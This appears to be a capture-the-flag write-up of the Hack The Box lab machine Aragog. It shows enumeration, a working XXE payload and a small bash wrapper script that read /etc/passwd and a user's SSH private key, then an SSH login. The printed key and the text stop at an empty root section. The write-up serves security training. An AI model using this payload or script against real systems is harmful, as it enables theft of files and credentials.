---
title: "[HTB] Machine: Aragog"
description: "[HTB] Machine: Aragog"
date: 2023-10-17
menu:
  sidebar:
    name: "[HTB] Machine: Aragog"
    identifier: htb-machine-Aragog
    parent: htb-machines-linux
    weight: 10
hero: images/aragog.png
tags: ["HTB", "xxe", "ssh", "pspy", "wordpress", "cron"]
---

# Aragog
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.78 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:10 BST
Nmap scan report for 10.10.10.78 (10.10.10.78)
Host is up (0.15s latency).
Not shown: 65493 filtered tcp ports (no-response), 39 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds

```
```
└─$ nmap -Pn -p21,22,80 -sC -sV 10.10.10.78 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:11 BST
Nmap scan report for 10.10.10.78 (10.10.10.78)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://aragog.htb/
Service Info: Host: aragog.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.47 seconds

```

- `ftp`
```
└─$ ftp anonymous@10.10.10.78  
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43838|)
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp> more test.txt
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

- Web server

![](./images/1.png)

- `wfuzz`
```
└─$ wfuzz -u http://aragog.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.aragog.htb' --hw 28
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://aragog.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================


```

- `feroxbuster`
```
└─$ feroxbuster -u http://aragog.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://aragog.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://aragog.htb/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://aragog.htb/
200      GET        3l        6w       46c http://aragog.htb/hosts.php
```
## Foothold
- http://aragog.htb/hosts.php
  - Could be related to `test` file we saw in `ftp`

![](./images/2.png)

- If we try sending `POST` request with `test.txt` from `ftp`, we have a response back
  - File format is `xml`
```
└─$ curl -X POST --data @test.txt http://aragog.htb/hosts.php

There are 62 possible hosts for 255.255.255.192
```

- We could try `XXE`
  - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
```                                                                                                          
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>

```

- If we send our payload we have a success
```
└─$ curl -X POST --data @evil.xml http://aragog.htb/hosts.php

There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:114:130:ftp daemon,,,:/srv/ftp:/bin/false
```

- We have 2 users
  - `florian` and `cliff`
  - First to look for is `id_rsa` inside their folders
  - Short script for easier navigation
```
#!/bin/bash

payload="<!--?xml version=\"1.0\" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$1\"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
"

echo "$payload" > xxe.payload
curl -s -XPOST -d @xxe.payload http://aragog.htb/hosts.php
```

- `florian` has `id_rsa` key
```
└─$ ./xxe-exploit.sh /home/florian/.ssh/id_rsa

There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

- Save it to file and `chmod 600`
```
└─$ ssh florian@aragog.htb -i id_rsa                   
Warning: Permanently added 'aragog.htb' (ED25519) to the list of known hosts.
Last login: Fri Sep 23 08:19:24 2022 from 10.10.14.29
florian@aragog:~$ 

```
## User
- We have a `wordpress`
```
florian@aragog:/var/www/html$ ls -lha dev_wiki/
total 200K
drwxrwxrwx  5 cliff    cliff    4.0K Oct 18 10:35 .
drwxrwxrwx  4 www-data www-data 4.0K Oct 18 10:35 ..
-rwxrwxrwx  1 cliff    cliff     253 Oct 18 10:35 .htaccess
-rwxrwxrwx  1 cliff    cliff     418 Oct 18 10:35 index.php
-rwxrwxrwx  1 cliff    cliff     20K Oct 18 10:35 license.txt
-rwxrwxrwx  1 cliff    cliff    7.3K Oct 18 10:35 readme.html
-rwxrwxrwx  1 cliff    cliff    5.4K Oct 18 10:35 wp-activate.php
drwxrwxrwx  9 cliff    cliff    4.0K Oct 18 10:35 wp-admin
-rwxrwxrwx  1 cliff    cliff     364 Oct 18 10:35 wp-blog-header.php
-rwxrwxrwx  1 cliff    cliff    1.6K Oct 18 10:35 wp-comments-post.php
-rwxrwxrwx  1 cliff    cliff    2.8K Oct 18 10:35 wp-config.php
drwxrwxrwx  6 cliff    cliff    4.0K Oct 18 10:35 wp-content
-rwxrwxrwx  1 cliff    cliff    3.6K Oct 18 10:35 wp-cron.php
drwxrwxrwx 18 cliff    cliff     12K Oct 18 10:35 wp-includes
-rwxrwxrwx  1 cliff    cliff    2.4K Oct 18 10:35 wp-links-opml.php
-rwxrwxrwx  1 cliff    cliff    3.3K Oct 18 10:35 wp-load.php
-rwxrwxrwx  1 cliff    cliff     36K Oct 18 10:35 wp-login.php
-rwxrwxrwx  1 cliff    cliff    7.9K Oct 18 10:35 wp-mail.php
-rwxrwxrwx  1 cliff    cliff     16K Oct 18 10:35 wp-settings.php
-rwxrwxrwx  1 cliff    cliff     30K Oct 18 10:35 wp-signup.php
-rwxrwxrwx  1 cliff    cliff    4.6K Oct 18 10:35 wp-trackback.php
-rwxrwxrwx  1 cliff    cliff    3.0K Oct 18 10:35 xmlrpc.php

```

## Root